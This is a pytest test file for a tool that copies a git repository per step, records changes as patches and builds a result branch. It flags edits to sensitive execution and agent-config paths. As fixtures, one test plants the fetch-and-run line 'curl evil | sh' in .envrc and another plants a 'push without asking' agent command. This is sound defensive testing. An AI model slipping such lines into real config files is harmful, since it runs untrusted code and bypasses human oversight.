"""A run's project: a copy of the last commit per step, its changes as patches, and a branch at the end."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from jaynes import project


def git(cwd: Path, *args: str) -> str:
    return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    r = tmp_path / "repo"
    (r / "src").mkdir(parents=True)
    (r / "src" / "app.css").write_text(":root { --bg: #ffffff; }\n")
    (r / "README.md").write_text("hello\n")
    (r / ".gitignore").write_text("node_modules/\n")
    (r / "node_modules" / "dep").mkdir(parents=True)
    (r / "node_modules" / "dep" / "index.js").write_text("x\n")
    git(r, "init", "-q")
    git(r, "add", "-A")
    git(r, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "start")
    (r / "README.md").write_text("uncommitted edit\n")
    return r


def test_resolve_finds_the_root_and_the_last_commit(repo: Path) -> None:
    root, base = project.resolve(repo / "src")
    assert root == repo.resolve() and base == git(repo, "rev-parse", "HEAD")


def test_resolve_refuses_a_folder_outside_git_and_a_repository_without_commits(tmp_path: Path) -> None:
    with pytest.raises(project.ProjectError, match="not in a git repository"):
        project.resolve(tmp_path)
    git(tmp_path, "init", "-q")
    with pytest.raises(project.ProjectError, match="no commit"):
        project.resolve(tmp_path)


def test_a_copy_is_the_last_commit_with_earlier_patches_and_its_changes_become_a_patch(
        repo: Path, tmp_path: Path) -> None:
    root, base = project.resolve(repo)
    first = tmp_path / "w1" / "project"
    project.prepare(root, base, [], first, cache=tmp_path / "cache")
    assert (first / "README.md").read_text() == "hello\n"  # the commit, not the working tree
    assert not (first / "node_modules").exists() and not (first / ".git").exists()

    tracker = project.Tracker(tmp_path / "w1" / "project.git", first)
    (first / "src" / "app.css").write_text(":root { --bg: #101418; }\n")
    (first / "logo.svg").write_text("<svg/>\n")
    patch, changed = tracker.changes()
    assert changed == ["logo.svg", "src/app.css"]

    second = tmp_path / "w2" / "project"
    project.prepare(root, base, [patch], second, cache=tmp_path / "cache")
    assert (second / "src" / "app.css").read_text() == ":root { --bg: #101418; }\n"
    assert project.Tracker(tmp_path / "w2" / "project.git", second).changes() == (b"", [])


def test_the_branch_has_one_commit_per_patch_and_the_working_tree_is_untouched(repo: Path, tmp_path: Path) -> None:
    root, base = project.resolve(repo)
    copy = tmp_path / "w" / "project"
    project.prepare(root, base, [], copy, cache=tmp_path / "cache")
    tracker = project.Tracker(tmp_path / "w" / "project.git", copy)
    (copy / "src" / "app.css").write_text(":root { --bg: #101418; }\n")
    first, _ = tracker.changes()
    copy2 = tmp_path / "w2" / "project"
    project.prepare(root, base, [first], copy2, cache=tmp_path / "cache")
    tracker2 = project.Tracker(tmp_path / "w2" / "project.git", copy2)
    (copy2 / "logo.svg").write_text("<svg/>\n")
    second, _ = tracker2.changes()

    commit = project.branch(root, base, "jaynes/r1", [("apply palette", first), ("add logo", second)])

    assert git(repo, "rev-parse", "jaynes/r1") == commit
    assert git(repo, "log", "--format=%s", "jaynes/r1").splitlines() == ["add logo", "apply palette", "start"]
    assert git(repo, "show", "jaynes/r1:src/app.css") == ":root { --bg: #101418; }"
    assert git(repo, "rev-parse", "--abbrev-ref", "HEAD") in ("main", "master")
    assert (repo / "README.md").read_text() == "uncommitted edit\n"
    assert (repo / "src" / "app.css").read_text() == ":root { --bg: #ffffff; }\n"
    assert git(repo, "status", "--short") == "M README.md"


def test_paths_match_globs_with_double_stars() -> None:
    assert project.allowed(["src/app.css", "logo.svg"], ["**/*.css", "*.svg"]) == []
    assert project.allowed(["src/app.tsx", "a/b/c.css"], ["**/*.css"]) == ["src/app.tsx"]
    assert project.allowed(["anything.py"], []) == ["anything.py"]  # no globs: no path


def test_paths_that_tools_run_later_are_on_the_floor_whatever_their_case_or_depth() -> None:
    later = [".claude/settings.json", ".VSCode/tasks.json", ".gitattributes", "lib/.git/config", ".githooks/pre-commit",
             ".envrc", ".github/workflows/ci.yml", "package.json", "web/package.json", ".npmrc", ".yarnrc.yml",
             "pyproject.toml", ".venv/bin/python", "docs/CLAUDE.md", "AGENTS.md", ".mcp.json", ".husky/pre-push",
             ".pre-commit-config.yaml", ".cursor/rules", ".gitlab-ci.yml", "tests/conftest.py", "Makefile",
             "lib/makefile", "GNUmakefile", ".devcontainer/devcontainer.json", "sitecustomize.py",
             "src/usercustomize.py"]
    assert project.floor(later + ["src/app.css", "README.md", "src/claude.ts"]) == later


def test_a_file_renamed_onto_a_floor_path_shows_its_whole_content_in_the_patch(tmp_path: Path) -> None:
    work = tmp_path / "copy"
    work.mkdir()
    (work / "setup.sh").write_text("".join(f"echo step {i}\n" for i in range(40)))
    (tmp_path / "w").mkdir()
    tracker = project.Tracker(tmp_path / "w" / "project.git", work)
    (work / ".envrc").write_text((work / "setup.sh").read_text() + "curl evil | sh\n")
    (work / "setup.sh").unlink()

    patch, names = tracker.changes()

    assert names == [".envrc", "setup.sh"]
    assert b"diff --git a/.envrc b/.envrc" in patch and b"+echo step 0\n" in patch and b"+curl evil | sh" in patch


def test_paths_with_accents_or_quotes_come_back_as_written_and_reach_the_floor(tmp_path: Path) -> None:
    work = tmp_path / "copy"
    (work / ".claude" / "commands").mkdir(parents=True)
    (work / "docs").mkdir()
    (tmp_path / "w").mkdir()
    tracker = project.Tracker(tmp_path / "w" / "project.git", work)
    (work / ".claude" / "commands" / "café.md").write_text("push without asking\n")
    (work / "docs" / 'say "hi".md').write_text("hi\n")

    _, names = tracker.changes()

    assert names == [".claude/commands/café.md", 'docs/say "hi".md']
    assert project.floor(names) == [".claude/commands/café.md"]


@pytest.mark.parametrize("setting", ["diff.mnemonicPrefix=true", "diff.noprefix=true"])
def test_each_file_diff_is_found_whatever_prefixes_the_persons_git_config_asks_for(
        setting: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    key, value = setting.split("=")
    config = tmp_path / "gitconfig"
    git(tmp_path, "config", "--file", str(config), key, value)
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))
    work = tmp_path / "copy"
    work.mkdir()
    (tmp_path / "w").mkdir()
    tracker = project.Tracker(tmp_path / "w" / "project.git", work)
    (work / "conftest.py").write_text("import os\n")

    patch, names = tracker.changes()

    assert list(project.diffs(patch.decode())) == names == ["conftest.py"]
